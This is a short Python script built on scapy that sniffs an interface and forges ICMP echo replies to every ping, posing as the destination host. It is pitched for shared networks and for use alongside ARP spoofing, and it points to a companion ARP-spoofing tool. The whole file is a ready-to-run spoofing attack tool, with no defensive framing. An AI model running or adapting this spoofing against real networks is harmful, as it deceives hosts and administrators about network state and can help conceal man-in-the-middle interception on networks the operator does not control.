#!/usr/bin/env python3
# Description: ICMP spoof reply
# Depends on:  scapy
#
# When in a shared network or ARP spoofing, this script will reply to
# ALL ICMP PING requests as though it came from the destination.
#
# Note: This does not cover the who has ARP requests to beat
# destination unknowns, you gotta fix that yourself.
#
# Hint: Use arp-broadcast-spoof, Luke.
#
# (c) 2020 Alexandr Savca, alexandr dot savca89 at gmail dot com

from scapy.all import *

def icmp_reply_spoof(interface):
    def spoof(req):
        if req.haslayer('ICMP') and req[ICMP].type == 8:
            print(f"ICMP req from {req[IP].src} to {req[IP].dst}")
            resp = Ether()/IP()/ICMP()/""

            resp[Ether].dst = req[Ether].src
            resp[Ether].src = req[Ether].dst

            resp[IP].src    = req[IP].dst
            resp[IP].dst    = req[IP].src

            resp[ICMP].type = 0
            resp[ICMP].id   = req[ICMP].id
            resp[ICMP].seq  = req[ICMP].seq

            resp[Raw].load  = req[Raw].load

            print(f"ICMP resp to {resp[IP].dst} as {resp[IP].src}")
            sendp(resp, iface=interface)

    sniff(prn=spoof, iface=interface)

def usage(program):
    print(f"""
[ ICMP Spoof Reply ]---------------------------------------------------

When a shared network or ARP spoofing, this script will reply to ALL
ICMP PING requests as though it came from the destination.

Note: This does not cover the who has ARP requests to beat destination
      unknowns. you gotta fix that yourself.

Hint: Use arp-spoof-flood, Luke!
-----------------------------------------------------------------------
Usage: {program} interface
""")

if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1:
        if sys.argv[1] == '-h' or sys.argv[1] == '--help':
            usage(sys.argv[0])
            sys.exit(1)
        else:
            interface = sys.argv[1]
    else:
        interface = get_working_if()

    if os.getuid() != 0:
        print("Must be superuser.")
        sys.exit(1)

    icmp_reply_spoof(interface)

# vim:sw=4:ts=4:sts=4:et:tw=71:cc=72
# End of file.
